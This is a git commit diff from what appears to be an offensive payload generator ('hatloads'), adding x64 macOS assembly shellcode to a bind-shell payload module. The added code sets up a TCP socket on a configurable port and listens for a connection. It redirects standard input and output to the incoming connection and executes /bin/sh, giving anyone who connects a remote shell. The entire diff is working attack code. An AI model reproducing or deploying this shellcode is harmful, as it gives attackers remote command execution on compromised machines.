ebc8b828457ea8ef1f9e93e16605fb15fda91cd0
Ivan Nikolsky <enty8080@gmail.com>
2022-01-16 14:13:54 +0300

    Update shell_bind_tcp.py

--- hatloads/payloads/macos/x64/shell_bind_tcp.py
+++ hatloads/payloads/macos/x64/shell_bind_tcp.py
@@ -35,7 +35,64 @@ class ShellReverseTCP(HatVenom):
         bport = self.convert_port(options['BPORT'])
 
         shellcode = f"""
-        
+        start:
+	        xor rdi, rdi
+	        mov dil, 0x2
+	        xor rsi, rsi
+	        mov sil, 0x1
+	        xor rdx, rdx
+
+	        xor rax, rax
+	        mov al, 2
+	        ror rax, 0x28
+	        mov al, 0x61
+	        mov	r12, rax
+            syscall
+
+            mov	r9, rax
+            mov rdi, rax
+            xor	rsi, rsi
+            push rsi
+            mov	esi, 0x{bport}0101
+            sub	esi, 1
+            push rsi
+            mov rsi, rsp
+            mov	dl, 0x10
+            add	r12b, 0x7
+            mov	rax, r12
+            syscall
+
+            xor	rsi, rsi
+	        inc	rsi
+            add	r12b, 0x2
+            mov	rax, r12
+            syscall
+
+            xor	rsi, rsi
+            sub	r12b, 0x4c
+            mov	rax, r12
+            syscall
+
+	        mov	rdi, rax
+	        xor	rsi, rsi
+	        add	r12b, 0x3c
+            mov	rax, r12
+            syscall
+
+            inc	rsi
+            mov rax, r12
+            syscall
+
+	        xor rsi, rsi
+	        push rsi
+	        mov rdi, 0x68732f6e69622f2f
+	        push rdi
+	        mov rdi, rsp
+	        xor rdx, rdx
+
+	        sub	r12b, 0x1f
+            mov	rax, r12
+            syscall
         """
 
         return self.assemble('x64', shellcode)
